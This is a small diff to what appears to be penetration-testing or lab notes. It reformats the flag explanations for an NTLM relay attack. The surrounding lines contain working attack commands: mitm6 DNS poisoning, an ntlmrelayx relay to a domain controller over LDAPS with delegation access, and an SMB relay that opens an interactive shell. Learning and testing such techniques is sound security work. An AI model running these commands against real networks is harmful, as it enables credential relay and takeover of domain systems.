@@ -45,9 +45,9 @@ sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
 ```
 ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access
 ```
-1. wh == server hosting WPAD (attacking IP)
-2. t == target for relay
-3.  i == open interactive shell
+  - wh == server hosting WPAD (attacking IP)
+  - t == target for relay
+  - i == open interactive shell
 
 ```
 ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
